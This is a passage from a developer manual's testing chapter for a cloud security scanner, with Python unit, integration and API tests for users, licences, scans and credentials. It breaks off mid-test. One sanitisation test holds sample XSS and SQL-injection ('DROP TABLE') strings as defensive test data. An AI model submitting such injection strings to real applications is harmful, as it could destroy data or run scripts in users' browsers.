# Aegis Cloud Scanner - Developer Manual
## Part 8: Testing Framework and Guidelines

**Document Version:** 1.0
**Last Updated:** September 2024
**Target Audience:** Software Developers, QA Engineers, Test Automation Engineers
**Classification:** Internal Development Documentation

---

## Table of Contents
1. [Testing Strategy Overview](#testing-strategy-overview)
2. [Unit Testing Framework](#unit-testing-framework)
3. [Integration Testing](#integration-testing)
4. [API Testing](#api-testing)
5. [Security Testing](#security-testing)
6. [Performance Testing](#performance-testing)
7. [End-to-End Testing](#end-to-end-testing)
8. [Test Data Management](#test-data-management)
9. [Continuous Testing Pipeline](#continuous-testing-pipeline)
10. [Quality Assurance Guidelines](#quality-assurance-guidelines)

---

## Testing Strategy Overview

### Testing Pyramid

The Aegis Cloud Scanner follows the testing pyramid approach with emphasis on automated testing at all levels:

```
                    ┌─────────────────┐
                    │   E2E Tests     │ ← 10% (UI, Full Integration)
                    │    (Slow)       │
                    └─────────────────┘
                  ┌───────────────────────┐
                  │  Integration Tests    │ ← 20% (API, Service Integration)
                  │     (Medium)          │
                  └───────────────────────┘
              ┌─────────────────────────────────┐
              │         Unit Tests              │ ← 70% (Fast, Isolated)
              │        (Fast)                   │
              └─────────────────────────────────┘
```

### Testing Objectives

1. **Functionality Validation**: Ensure all features work as expected
2. **Security Assurance**: Validate security controls and identify vulnerabilities
3. **Performance Verification**: Confirm system meets performance requirements
4. **Reliability Testing**: Ensure system stability under various conditions
5. **Integration Validation**: Verify component interactions work correctly

### Test Environment Strategy

```python
class TestEnvironment:
    """Test environment configuration"""

    ENVIRONMENTS = {
        'unit': {
            'description': 'Isolated unit tests with mocked dependencies',
            'database': 'sqlite:///:memory:',
            'external_services': 'mocked',
            'parallel_execution': True
        },
        'integration': {
            'description': 'Integration tests with real database',
            'database': 'sqlite:///test_integration.db',
            'external_services': 'mocked',
            'parallel_execution': False
        },
        'staging': {
            'description': 'Full system testing environment',
            'database': 'postgresql://test_user:password@localhost/test_db',
            'external_services': 'real',
            'parallel_execution': False
        },
        'performance': {
            'description': 'Performance and load testing',
            'database': 'postgresql://perf_user:password@localhost/perf_db',
            'external_services': 'real',
            'data_volume': 'large'
        }
    }

    @classmethod
    def setup_environment(cls, env_type: str):
        """Setup test environment"""
        config = cls.ENVIRONMENTS.get(env_type)
        if not config:
            raise ValueError(f"Unknown environment type: {env_type}")

        # Configure database
        os.environ['DATABASE_URL'] = config['database']

        # Configure external services
        if config['external_services'] == 'mocked':
            os.environ['MOCK_CLOUD_SERVICES'] = 'true'

        return config
```

---

## Unit Testing Framework

### Test Structure and Organization

```python
import unittest
import pytest
from unittest.mock import Mock, patch, MagicMock
from parameterized import parameterized
import tempfile
import os

class BaseTestCase(unittest.TestCase):
    """Base test case with common setup and utilities"""

    def setUp(self):
        """Set up test fixtures"""
        # Create temporary directory for test files
        self.test_dir = tempfile.mkdtemp()

        # Setup test database
        from app import app, db
        app.config['TESTING'] = True
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        app.config['WTF_CSRF_ENABLED'] = False

        self.app = app
        self.app_context = app.app_context()
        self.app_context.push()

        # Create all tables
        db.create_all()

        # Setup test client
        self.client = app.test_client()

    def tearDown(self):
        """Clean up after tests"""
        from app import db

        # Remove database
        db.session.remove()
        db.drop_all()

        # Clean up application context
        self.app_context.pop()

        # Clean up temporary files
        import shutil
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def create_test_user(self, username='testuser', email='test@example.com',
                        license_type='basic', **kwargs):
        """Helper to create test user"""
        from models import User

        user = User(
            username=username,
            email=email,
            license_type=license_type,
            **kwargs
        )
        user.set_password('testpassword123')
        user.save()
        return user

    def create_test_scan_result(self, user, provider='aws', **kwargs):
        """Helper to create test scan result"""
        from models import ScanResult

        scan_result = ScanResult(
            user_id=user.id,
            provider=provider,
            scan_name=f'Test {provider.upper()} Scan',
            status='completed',
            **kwargs
        )
        scan_result.save()
        return scan_result

    def assert_response_success(self, response, expected_status=200):
        """Assert response is successful"""
        self.assertEqual(response.status_code, expected_status)

    def assert_response_error(self, response, expected_status=400):
        """Assert response is error"""
        self.assertGreaterEqual(response.status_code, expected_status)

    def assert_json_response(self, response, expected_keys=None):
        """Assert response is valid JSON with expected keys"""
        self.assertEqual(response.content_type, 'application/json')
        data = response.get_json()
        self.assertIsInstance(data, dict)

        if expected_keys:
            for key in expected_keys:
                self.assertIn(key, data)

        return data

class TestUserModel(BaseTestCase):
    """Test User model functionality"""

    def test_user_creation(self):
        """Test user creation with valid data"""
        user = self.create_test_user()

        self.assertEqual(user.username, 'testuser')
        self.assertEqual(user.email, 'test@example.com')
        self.assertEqual(user.license_type, 'basic')
        self.assertTrue(user.check_password('testpassword123'))

    def test_password_hashing(self):
        """Test password hashing and verification"""
        user = self.create_test_user()

        # Password should be hashed
        self.assertNotEqual(user.password_hash, 'testpassword123')

        # Should verify correct password
        self.assertTrue(user.check_password('testpassword123'))

        # Should reject incorrect password
        self.assertFalse(user.check_password('wrongpassword'))

    def test_user_license_validation(self):
        """Test user license validation"""
        from datetime import datetime, timezone, timedelta

        # User with no license expiry
        user = self.create_test_user()
        self.assertFalse(user.has_valid_license())

        # User with future license expiry
        future_date = datetime.now(timezone.utc) + timedelta(days=30)
        user.license_expires_at = future_date
        user.save()
        self.assertTrue(user.has_valid_license())

        # User with past license expiry
        past_date = datetime.now(timezone.utc) - timedelta(days=1)
        user.license_expires_at = past_date
        user.save()
        self.assertFalse(user.has_valid_license())

    @parameterized.expand([
        ('basic', 'scan:view', False),
        ('basic', 'scan:create', True),
        ('pro', 'scan:view', True),
        ('pro', 'scan:export', True),
        ('pro', 'admin:users', False),
    ])
    def test_user_feature_access(self, license_type, feature, expected_access):
        """Test user feature access based on license"""
        user = self.create_test_user(license_type=license_type)

        # Mock the feature access check
        with patch('models.User.has_feature_access') as mock_access:
            mock_access.return_value = expected_access
            result = user.has_feature_access(feature)
            self.assertEqual(result, expected_access)

class TestScanResultModel(BaseTestCase):
    """Test ScanResult model functionality"""

    def test_scan_result_creation(self):
        """Test scan result creation"""
        user = self.create_test_user()
        scan_result = self.create_test_scan_result(user)

        self.assertEqual(scan_result.user_id, user.id)
        self.assertEqual(scan_result.provider, 'aws')
        self.assertEqual(scan_result.status, 'completed')

    def test_scan_result_duration_calculation(self):
        """Test scan duration calculation"""
        from datetime import datetime, timezone, timedelta

        user = self.create_test_user()
        start_time = datetime.now(timezone.utc)
        end_time = start_time + timedelta(minutes=15)

        scan_result = self.create_test_scan_result(
            user,
            started_at=start_time,
            completed_at=end_time
        )

        scan_result.calculate_duration()
        self.assertEqual(scan_result.duration_seconds, 900)  # 15 minutes

    def test_scan_result_risk_score_calculation(self):
        """Test risk score calculation"""
        user = self.create_test_user()
        scan_result = self.create_test_scan_result(
            user,
            critical_count=2,
            high_count=5,
            medium_count=10,
            low_count=15
        )

        # Mock risk score calculation
        expected_score = (2 * 10) + (5 * 5) + (10 * 2) + (15 * 1)  # 90
        with patch.object(scan_result, 'calculate_risk_score', return_value=expected_score):
            score = scan_result.calculate_risk_score()
            self.assertEqual(score, expected_score)

class TestLicenseManager(BaseTestCase):
    """Test license management functionality"""

    def setUp(self):
        super().setUp()
        from licenses.license_manager import LicenseManager
        self.license_manager = LicenseManager()

    def test_license_validation(self):
        """Test license validation"""
        # Mock valid license
        valid_license = {
            'license_type': 'pro',
            'expires_at': '2025-12-31T23:59:59Z',
            'signature': 'valid_signature'
        }

        with patch.object(self.license_manager, '_verify_signature', return_value=True):
            result = self.license_manager.validate_license(valid_license)
            self.assertTrue(result.is_valid)

    def test_license_expiry_check(self):
        """Test license expiry validation"""
        from datetime import datetime, timezone, timedelta

        # Expired license
        expired_license = {
            'license_type': 'pro',
            'expires_at': (datetime.now(timezone.utc) - timedelta(days=1)).isoformat(),
            'signature': 'valid_signature'
        }

        with patch.object(self.license_manager, '_verify_signature', return_value=True):
            result = self.license_manager.validate_license(expired_license)
            self.assertFalse(result.is_valid)
            self.assertIn('expired', result.error_message.lower())

    def test_feature_access_control(self):
        """Test feature access control"""
        user = self.create_test_user(license_type='basic')

        # Basic user should not have pro features
        self.assertFalse(user.has_feature_access('multi_cloud_scan'))
        self.assertFalse(user.has_feature_access('advanced_reporting'))

        # Update to pro license
        user.license_type = 'pro'
        user.save()

        # Pro user should have pro features
        self.assertTrue(user.has_feature_access('multi_cloud_scan'))
        self.assertTrue(user.has_feature_access('advanced_reporting'))

class TestCloudScanners(BaseTestCase):
    """Test cloud scanner functionality"""

    def setUp(self):
        super().setUp()
        self.mock_credentials = {
            'aws': {
                'access_key_id': 'AKIA123456789',
                'secret_access_key': 'secret123',
                'region': 'us-east-1'
            },
            'gcp': {
                'project_id': 'test-project',
                'service_account_path': '/path/to/sa.json'
            },
            'azure': {
                'subscription_id': 'sub-123',
                'tenant_id': 'tenant-123',
                'client_id': 'client-123',
                'client_secret': 'secret123'
            }
        }

    @patch('scanners.aws.aws_scanner.boto3.Session')
    def test_aws_scanner_authentication(self, mock_session):
        """Test AWS scanner authentication"""
        from scanners.aws.aws_scanner import AWSCloudProvider

        # Mock successful authentication
        mock_sts = Mock()
        mock_sts.get_caller_identity.return_value = {'Account': '123456789012'}
        mock_session.return_value.client.return_value = mock_sts

        scanner = AWSCloudProvider(self.mock_credentials['aws'])
        result = scanner.authenticate()

        self.assertTrue(result)
        mock_session.assert_called_once()

    @patch('scanners.aws.aws_scanner.boto3.Session')
    def test_aws_scanner_authentication_failure(self, mock_session):
        """Test AWS scanner authentication failure"""
        from scanners.aws.aws_scanner import AWSCloudProvider
        from botocore.exceptions import ClientError

        # Mock authentication failure
        mock_session.return_value.client.side_effect = ClientError(
            {'Error': {'Code': 'InvalidUserID.NotFound'}}, 'GetCallerIdentity'
        )

        scanner = AWSCloudProvider(self.mock_credentials['aws'])
        result = scanner.authenticate()

        self.assertFalse(result)

    @patch('scanners.aws.aws_scanner.boto3.Session')
    def test_aws_ec2_scanning(self, mock_session):
        """Test AWS EC2 scanning functionality"""
        from scanners.aws.aws_scanner import AWSCloudProvider

        # Mock EC2 instances
        mock_ec2 = Mock()
        mock_ec2.describe_instances.return_value = {
            'Reservations': [{
                'Instances': [{
                    'InstanceId': 'i-1234567890abcdef0',
                    'InstanceType': 't2.micro',
                    'State': {'Name': 'running'},
                    'PublicIpAddress': '1.2.3.4',
                    'BlockDeviceMappings': [{
                        'DeviceName': '/dev/sda1',
                        'Ebs': {'VolumeId': 'vol-12345', 'Encrypted': False}
                    }]
                }]
            }]
        }

        mock_session.return_value.client.return_value = mock_ec2

        scanner = AWSCloudProvider(self.mock_credentials['aws'])
        scanner.session = mock_session.return_value
        results = scanner._scan_ec2('us-east-1')

        self.assertIsInstance(results, list)
        self.assertGreater(len(results), 0)

        # Check for expected findings
        result = results[0]
        self.assertEqual(result.provider, 'aws')
        self.assertEqual(result.service, 'ec2')
        self.assertIn('findings', result.__dict__)

    def test_scanner_factory(self):
        """Test cloud scanner factory"""
        from scanners import CloudScannerFactory

        # Test AWS scanner creation
        aws_scanner = CloudScannerFactory.create_scanner('aws')
        self.assertIsNotNone(aws_scanner)

        # Test GCP scanner creation
        gcp_scanner = CloudScannerFactory.create_scanner('gcp')
        self.assertIsNotNone(gcp_scanner)

        # Test invalid provider
        with self.assertRaises(ValueError):
            CloudScannerFactory.create_scanner('invalid')

class TestUtilities(BaseTestCase):
    """Test utility functions"""

    def test_password_validation(self):
        """Test password validation utility"""
        from utils.auth import PasswordSecurity

        password_security = PasswordSecurity()

        # Test strong password
        strong_password = 'MyStr0ng!P@ssw0rd123'
        result = password_security.validate_password_strength(strong_password)
        self.assertTrue(result['is_valid'])
        self.assertEqual(result['strength'], 'very_strong')

        # Test weak password
        weak_password = 'password'
        result = password_security.validate_password_strength(weak_password)
        self.assertFalse(result['is_valid'])
        self.assertIn('too common', ' '.join(result['issues']))

    def test_input_sanitization(self):
        """Test input sanitization"""
        from utils.validation import InputValidator

        validator = InputValidator()

        # Test XSS prevention
        malicious_input = '<script>alert("xss")</script>'
        sanitized = validator.sanitize_string(malicious_input)
        self.assertNotIn('<script>', sanitized)

        # Test SQL injection prevention
        sql_injection = "'; DROP TABLE users; --"
        sanitized = validator.sanitize_string(sql_injection)
        self.assertNotEqual(sql_injection, sanitized)

    def test_encryption_utilities(self):
        """Test encryption/decryption utilities"""
        from utils.encryption import EncryptionManager

        encryption_manager = EncryptionManager()
        test_data = "sensitive information"

        # Test encryption
        encrypted = encryption_manager.encrypt_sensitive_data(test_data)
        self.assertNotEqual(test_data, encrypted)

        # Test decryption
        decrypted = encryption_manager.decrypt_sensitive_data(encrypted)
        self.assertEqual(test_data, decrypted)

# Test Fixtures and Factories
class TestDataFactory:
    """Factory for creating test data"""

    @staticmethod
    def create_user(**kwargs):
        """Create test user with default values"""
        defaults = {
            'username': 'testuser',
            'email': 'test@example.com',
            'license_type': 'basic',
            'is_active': True
        }
        defaults.update(kwargs)
        return defaults

    @staticmethod
    def create_scan_result(**kwargs):
        """Create test scan result with default values"""
        defaults = {
            'scan_name': 'Test Scan',
            'provider': 'aws',
            'status': 'completed',
            'critical_count': 0,
            'high_count': 0,
            'medium_count': 0,
            'low_count': 0
        }
        defaults.update(kwargs)
        return defaults

    @staticmethod
    def create_finding(**kwargs):
        """Create test finding with default values"""
        defaults = {
            'finding_id': 'TEST-001',
            'rule_id': 'test-rule',
            'title': 'Test Finding',
            'description': 'Test security finding',
            'severity': 'medium',
            'resource_type': 'test_resource',
            'resource_id': 'test-resource-123'
        }
        defaults.update(kwargs)
        return defaults

# Pytest Configuration
@pytest.fixture
def app():
    """Create application for testing"""
    from app import create_app
    app = create_app('testing')
    yield app

@pytest.fixture
def client(app):
    """Create test client"""
    return app.test_client()

@pytest.fixture
def db(app):
    """Create database for testing"""
    from app import db
    with app.app_context():
        db.create_all()
        yield db
        db.session.remove()
        db.drop_all()

@pytest.fixture
def authenticated_user(client, db):
    """Create authenticated user for testing"""
    from models import User
    user = User(
        username='testuser',
        email='test@example.com',
        license_type='pro'
    )
    user.set_password('testpassword123')
    user.save()

    # Login user
    client.post('/login', data={
        'username': 'testuser',
        'password': 'testpassword123'
    })

    return user
```

---

## Integration Testing

### Service Integration Tests

```python
import pytest
import requests_mock
from unittest.mock import patch, Mock

class IntegrationTestCase(BaseTestCase):
    """Base class for integration tests"""

    def setUp(self):
        super().setUp()
        # Use real database for integration tests
        self.app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test_integration.db'

    def tearDown(self):
        super().tearDown()
        # Clean up integration test database
        import os
        db_path = 'test_integration.db'
        if os.path.exists(db_path):
            os.remove(db_path)

class TestUserWorkflow(IntegrationTestCase):
    """Test complete user workflows"""

    def test_user_registration_and_login_flow(self):
        """Test complete user registration and login workflow"""
        # Step 1: Register new user
        registration_data = {
            'username': 'newuser',
            'email': 'newuser@example.com',
            'password': 'StrongPassword123!',
            'first_name': 'Test',
            'last_name': 'User'
        }

        response = self.client.post('/register', json=registration_data)
        self.assert_response_success(response, 201)

        # Verify user was created
        from models import User
        user = User.query.filter_by(username='newuser').first()
        self.assertIsNotNone(user)
        self.assertEqual(user.email, 'newuser@example.com')

        # Step 2: Login with new user
        login_data = {
            'username': 'newuser',
            'password': 'StrongPassword123!'
        }

        response = self.client.post('/login', json=login_data)
        self.assert_response_success(response)

        # Verify login response
        data = self.assert_json_response(response, ['access_token', 'user'])
        self.assertIn('access_token', data)

        # Step 3: Access protected resource
        headers = {'Authorization': f"Bearer {data['access_token']}"}
        response = self.client.get('/api/v1/user/profile', headers=headers)
        self.assert_response_success(response)

        profile_data = self.assert_json_response(response, ['username', 'email'])
        self.assertEqual(profile_data['username'], 'newuser')

    def test_scan_workflow_end_to_end(self):
        """Test complete scan workflow"""
        # Setup authenticated user
        user = self.create_test_user(license_type='pro')

        # Create cloud credentials
        credentials_data = {
            'name': 'Test AWS Account',
            'provider': 'aws',
            'credentials': {
                'access_key_id': 'AKIA123456789',
                'secret_access_key': 'secret123',
                'region': 'us-east-1'
            }
        }

        with patch('app.current_user', user):
            response = self.client.post('/api/v1/credentials', json=credentials_data)
            self.assert_response_success(response, 201)

            credential_data = self.assert_json_response(response, ['id'])
            credential_id = credential_data['id']

            # Create scan
            scan_data = {
                'name': 'Integration Test Scan',
                'provider': 'aws',
                'credential_id': credential_id,
                'scan_type': 'full',
                'config': {
                    'regions': ['us-east-1'],
                    'services': ['ec2', 's3']
                }
            }

            with patch('scanners.aws.aws_scanner.AWSCloudProvider') as mock_scanner:
                # Mock scanner behavior
                mock_instance = Mock()
                mock_instance.authenticate.return_value = True
                mock_instance.execute_full_scan.return_value = [
                    Mock(
                        provider='aws',
                        service='ec2',
                        resource_type='instance',
                        resource_id='i-123456',
                        findings=[{
                            'rule_id': 'aws-ec2-public-ip',
                            'severity': 'medium',
                            'title': 'EC2 Instance with Public IP'
                        }]
                    )
                ]
                mock_scanner.return_value = mock_instance

                response = self.client.post('/api/v1/scans', json=scan_data)
                self.assert_response_success(response, 201)

                scan_response = self.assert_json_response(response, ['scan'])
                scan_id = scan_response['scan']['id']

                # Wait for scan completion (simulated)
                # In real integration tests, you might need to poll the status
                import time
                time.sleep(1)

                # Check scan results
                response = self.client.get(f'/api/v1/scans/{scan_id}')
                self.assert_response_success(response)

                scan_details = self.assert_json_response(response, ['scan'])
                self.assertEqual(scan_details['scan']['status'], 'completed')

                # Get findings
                response = self.client.get(f'/api/v1/scans/{scan_id}/findings')
                self.assert_response_success(response)

                findings_data = self.assert_json_response(response, ['findings'])
                self.assertGreater(len(findings_data['findings']), 0)

class TestDatabaseIntegration(IntegrationTestCase):
    """Test database integration scenarios"""

    def test_database_transactions(self):
        """Test database transaction handling"""
        from models import User, ScanResult
        from app import db

        # Test successful transaction
        try:
            with db.session.begin():
                user = User(
                    username='transactionuser',
                    email='transaction@example.com',
                    license_type='basic'
                )
                user.set_password('password123')
                db.session.add(user)
                db.session.flush()  # Get user ID

                scan_result = ScanResult(
                    user_id=user.id,
                    provider='aws',
                    scan_name='Transaction Test Scan',
                    status='pending'
                )
                db.session.add(scan_result)

            # Verify data was committed
            user = User.query.filter_by(username='transactionuser').first()
            self.assertIsNotNone(user)

            scan = ScanResult.query.filter_by(user_id=user.id).first()
            self.assertIsNotNone(scan)

        except Exception as e:
            self.fail(f"Transaction should have succeeded: {e}")

    def test_database_rollback(self):
        """Test database rollback on error"""
        from models import User, ScanResult
        from app import db

        # Test rollback on error
        try:
            with db.session.begin():
                user = User(
                    username='rollbackuser',
                    email='rollback@example.com',
                    license_type='basic'
                )
                user.set_password('password123')
                db.session.add(user)
                db.session.flush()

                # Cause an error
                scan_result = ScanResult(
                    user_id=user.id,
                    provider='invalid_provider',  # This should cause validation error
                    scan_name='Rollback Test Scan'
                )
                db.session.add(scan_result)

                # Force validation error
                raise ValueError("Simulated error")

        except ValueError:
            pass  # Expected error

        # Verify data was rolled back
        user = User.query.filter_by(username='rollbackuser').first()
        self.assertIsNone(user)

class TestExternalServiceIntegration(IntegrationTestCase):
    """Test integration with external services"""

    @requests_mock.Mocker()
    def test_webhook_integration(self, m):
        """Test webhook integration"""
        webhook_url = 'https://example.com/webhook'

        # Mock webhook endpoint
        m.post(webhook_url, json={'status': 'received'}, status_code=200)

        # Setup webhook
        from utils.webhooks import WebhookManager
        webhook_manager = WebhookManager()

        # Send webhook
        webhook_data = {
            'event': 'scan.completed',
            'scan_id': 123,
            'status': 'completed'
        }

        result = webhook_manager.send_webhook(webhook_url, webhook_data)
        self.assertTrue(result)

        # Verify request was made
        self.assertEqual(len(m.request_history), 1)
        self.assertEqual(m.request_history[0].json(), webhook_data)

    @patch('smtplib.SMTP')
    def test_email_integration(self, mock_smtp):
        """Test email service integration"""
        from utils.notifications import EmailNotifier

        # Mock SMTP server
        mock_server = Mock()
        mock_smtp.return_value = mock_server

        email_notifier = EmailNotifier()

        # Send test email
        result = email_notifier.send_notification(
            to_email='test@example.com',
            subject='Test Notification',
            body='This is a test notification'
        )

        self.assertTrue(result)
        mock_server.send_message.assert_called_once()

class TestLicenseIntegration(IntegrationTestCase):
    """Test license system integration"""

    def test_license_middleware_integration(self):
        """Test license middleware with real requests"""
        # Create user with expired license
        from datetime import datetime, timezone, timedelta

        user = self.create_test_user(
            license_type='pro',
            license_expires_at=datetime.now(timezone.utc) - timedelta(days=1)
        )

        # Try to access protected endpoint
        with patch('app.current_user', user):
            response = self.client.get('/api/v1/scans')

            # Should be blocked due to expired license
            self.assertEqual(response.status_code, 403)

            data = self.assert_json_response(response)
            self.assertIn('license', data.get('error', '').lower())

    def test_feature_access_integration(self):
        """Test feature access control integration"""
        # Create basic user
        basic_user = self.create_test_user(license_type='basic')

        # Try to access pro feature
        with patch('app.current_user', basic_user):
            response = self.client.post('/api/v1/scans/export',
                json={'format': 'pdf', 'scan_ids': [1, 2, 3]})

            # Should be blocked due to insufficient license
            self.assertEqual(response.status_code, 403)

        # Create pro user
        pro_user = self.create_test_user(license_type='pro', username='prouser')

        # Try to access pro feature
        with patch('app.current_user', pro_user):
            response = self.client.post('/api/v1/scans/export',
                json={'format': 'pdf', 'scan_ids': [1, 2, 3]})

            # Should be allowed (might return 404 for non-existent scans, but not 403)
            self.assertNotEqual(response.status_code, 403)

class TestCloudProviderIntegration(IntegrationTestCase):
    """Test cloud provider integration"""

    @patch('scanners.aws.aws_scanner.boto3')
    def test_aws_integration_with_real_flow(self, mock_boto3):
        """Test AWS integration with realistic flow"""
        # Mock boto3 session and clients
        mock_session = Mock()
        mock_boto3.Session.return_value = mock_session

        # Mock STS client for authentication
        mock_sts = Mock()
        mock_sts.get_caller_identity.return_value = {
            'Account': '123456789012',
            'UserId': 'AIDABC123DEFGHIJKLMN',
            'Arn': 'arn:aws:iam::123456789012:user/testuser'
        }

        # Mock EC2 client
        mock_ec2 = Mock()
        mock_ec2.describe_regions.return_value = {
            'Regions': [
                {'RegionName': 'us-east-1'},
                {'RegionName': 'us-west-2'}
            ]
        }
        mock_ec2.describe_instances.return_value = {
            'Reservations': [{
                'Instances': [{
                    'InstanceId': 'i-1234567890abcdef0',
                    'InstanceType': 't2.micro',
                    'State': {'Name': 'running'},
                    'PublicIpAddress': '203.0.113.1',
                    'BlockDeviceMappings': [{
                        'DeviceName': '/dev/sda1',
                        'Ebs': {'VolumeId': 'vol-12345', 'Encrypted': False}
                    }],
                    'MetadataOptions': {'HttpTokens': 'optional'}
                }]
            }]
        }

        # Configure mock session to return appropriate clients
        def mock_client(service_name, **kwargs):
            if service_name == 'sts':
                return mock_sts
            elif service_name == 'ec2':
                return mock_ec2
            else:
                return Mock()

        mock_session.client = mock_client

        # Test the integration
        from scanners.aws.aws_scanner import AWSCloudProvider

        credentials = {
            'access_key_id': 'AKIA123456789EXAMPLE',
            'secret_access_key': 'secretkey123',
            'region': 'us-east-1'
        }

        scanner = AWSCloudProvider(credentials)

        # Test authentication
        auth_result = scanner.authenticate()
        self.assertTrue(auth_result)

        # Test region discovery
        regions = scanner.discover_regions()
        self.assertIn('us-east-1', regions)
        self.assertIn('us-west-2', regions)

        # Test EC2 scanning
        scan_results = scanner._scan_ec2('us-east-1')
        self.assertIsInstance(scan_results, list)
        self.assertGreater(len(scan_results), 0)

        # Verify findings
        result = scan_results[0]
        self.assertEqual(result.provider, 'aws')
        self.assertEqual(result.service, 'ec2')
        self.assertGreater(len(result.findings), 0)

        # Check specific findings
        findings = result.findings
        finding_types = [f['rule_id'] for f in findings]
        self.assertIn('aws-ec2-public-ip', finding_types)
        self.assertIn('aws-ec2-unencrypted-volume', finding_types)
```

---

## API Testing

### RESTful API Test Suite

```python
import json
from unittest.mock import patch

class APITestCase(BaseTestCase):
    """Base class for API tests"""

    def setUp(self):
        super().setUp()
        self.api_base_url = '/api/v1'

    def make_authenticated_request(self, method, endpoint, user=None, **kwargs):
        """Make authenticated API request"""
        if not user:
            user = self.create_test_user(license_type='pro')

        # Generate JWT token
        from utils.auth import JWTManager
        jwt_manager = JWTManager(self.app.config['SECRET_KEY'])
        permissions = ['scan:read', 'scan:write', 'report:read']
        tokens = jwt_manager.generate_tokens(user.id, permissions)

        headers = kwargs.pop('headers', {})
        headers['Authorization'] = f"Bearer {tokens['access_token']}"
        headers['Content-Type'] = 'application/json'

        method_func = getattr(self.client, method.lower())
        return method_func(f"{self.api_base_url}{endpoint}", headers=headers, **kwargs)

class TestAuthenticationAPI(APITestCase):
    """Test authentication API endpoints"""

    def test_login_api_success(self):
        """Test successful API login"""
        user = self.create_test_user()

        login_data = {
            'username': 'testuser',
            'password': 'testpassword123'
        }

        response = self.client.post(f'{self.api_base_url}/auth/login', json=login_data)
        self.assert_response_success(response)

        data = self.assert_json_response(response, ['access_token', 'refresh_token', 'user'])
        self.assertIsNotNone(data['access_token'])
        self.assertEqual(data['user']['username'], 'testuser')

    def test_login_api_invalid_credentials(self):
        """Test API login with invalid credentials"""
        user = self.create_test_user()

        login_data = {
            'username': 'testuser',
            'password': 'wrongpassword'
        }

        response = self.client.post(f'{self.api_base_url}/auth/login', json=login_data)
        self.assert_response_error(response, 401)

        data = self.assert_json_response(response)
        self.assertIn('error', data)

    def test_token_refresh(self):
        """Test token refresh functionality"""
        user = self.create_test_user()

        # Login to get tokens
        login_data = {
            'username': 'testuser',
            'password': 'testpassword123'
        }

        response = self.client.post(f'{self.api_base_url}/auth/login', json=login_data)
        tokens = response.get_json()

        # Use refresh token to get new access token
        refresh_data = {
            'refresh_token': tokens['refresh_token']
        }

        response = self.client.post(f'{self.api_base_url}/auth/refresh', json=refresh_data)
        self.assert_response_success(response)

        new_tokens = self.assert_json_response(response, ['access_token'])
        self.assertIsNotNone(new_tokens['access_token'])
        self.assertNotEqual(new_tokens['access_token'], tokens['access_token'])

    def test_logout_api(self):
        """Test API logout"""
        user = self.create_test_user()
        response = self.make_authenticated_request('POST', '/auth/logout', user)
        self.assert_response_success(response, 204)

class TestScanAPI(APITestCase):
    """Test scan management API"""

    def test_list_scans(self):
        """Test listing user scans"""
        user = self.create_test_user()
        scan1 = self.create_test_scan_result(user, provider='aws')
        scan2 = self.create_test_scan_result(user, provider='gcp')

        response = self.make_authenticated_request('GET', '/scans', user)
        self.assert_response_success(response)

        data = self.assert_json_response(response, ['scans', 'pagination'])
        self.assertEqual(len(data['scans']), 2)

        # Verify scan data
        scan_ids = [scan['id'] for scan in data['scans']]
        self.assertIn(scan1.id, scan_ids)
        self.assertIn(scan2.id, scan_ids)

    def test_list_scans_with_filters(self):
        """Test listing scans with filters"""
        user = self.create_test_user()
        aws_scan = self.create_test_scan_result(user, provider='aws')
        gcp_scan = self.create_test_scan_result(user, provider='gcp')

        # Filter by provider
        response = self.make_authenticated_request('GET', '/scans?provider=aws', user)
        self.assert_response_success(response)

        data = self.assert_json_response(response, ['scans'])
        self.assertEqual(len(data['scans']), 1)
        self.assertEqual(data['scans'][0]['provider'], 'aws')

    def test_create_scan(self):
        """Test creating new scan"""
        user = self.create_test_user(license_type='pro')

        # Create credential first
        from models import CloudCredential
        credential = CloudCredential(
            user_id=user.id,
            name='Test AWS Credential',
            provider='aws',
            encrypted_credentials='encrypted_data',
            salt='salt123'
        )
        credential.save()

        scan_data = {
            'name': 'API Test Scan',
            'provider': 'aws',
            'credential_id': credential.id,
            'scan_type': 'full',
            'config': {
                'regions': ['us-east-1'],
                'services': ['ec2', 's3']
            }
        }

        with patch('scanners.aws.aws_scanner.AWSCloudProvider') as mock_scanner:
            mock_instance = Mock()
            mock_instance.authenticate.return_value = True
            mock_scanner.return_value = mock_instance

            response = self.make_authenticated_request('POST', '/scans', user, json=scan_data)
            self.assert_response_success(response, 201)

            data = self.assert_json_response(response, ['scan'])
            self.assertEqual(data['scan']['name'], 'API Test Scan')
            self.assertEqual(data['scan']['provider'], 'aws')

    def test_create_scan_invalid_data(self):
        """Test creating scan with invalid data"""
        user = self.create_test_user()

        invalid_scan_data = {
            'name': '',  # Empty name
            'provider': 'invalid_provider',  # Invalid provider
            'credential_id': 99999  # Non-existent credential
        }

        response = self.make_authenticated_request('POST', '/scans', user, json=invalid_scan_data)
        self.assert_response_error(response, 400)

        data = self.assert_json_response(response)
        self.assertIn('error', data)

    def test_get_scan_details(self):
        """Test getting scan details"""
        user = self.create_test_user()
        scan = self.create_test_scan_result(user)

        response = self.make_authenticated_request('GET', f'/scans/{scan.id}', user)
        self.assert_response_success(response)

        data = self.assert_json_response(response, ['scan'])
        self.assertEqual(data['scan']['id'], scan.id)
        self.assertEqual(data['scan']['provider'], scan.provider)

    def test_get_scan_unauthorized(self):
        """Test accessing scan belonging to another user"""
        user1 = self.create_test_user(username='user1')
        user2 = self.create_test_user(username='user2', email='user2@example.com')

        scan = self.create_test_scan_result(user1)

        # User2 tries to access User1's scan
        response = self.make_authenticated_request('GET', f'/scans/{scan.id}', user2)
        self.assert_response_error(response, 403)

    def test_delete_scan(self):
        """Test deleting scan"""
        user = self.create_test_user()
        scan = self.create_test_scan_result(user)

        response = self.make_authenticated_request('DELETE', f'/scans/{scan.id}', user)
        self.assert_response_success(response, 204)

        # Verify scan is deleted
        from models import ScanResult
        deleted_scan = ScanResult.get_by_id(scan.id)
        self.assertIsNone(deleted_scan)

class TestCredentialsAPI(APITestCase):
    """Test credentials management API"""

    def test_list_credentials(self):
        """Test listing user credentials"""
        user = self.create_test_user()

        # Create test credentials
        from models import CloudCredential
        cred1 = CloudCredential(
            user_id=user.id,
            name='AWS Prod',
            provider='aws',
            encrypted_credentials='encrypted1',
            salt='salt1'
        )
        cred1.save()

        cred2 = CloudCredential(
            user_id=user.id,
            name='GCP Test',
            provider='gcp',
            encrypted_credentials='encrypted2',
            salt='salt2'
        )
        cred2.save()

        response = self.make_authenticated_request('GET', '/credentials', user)
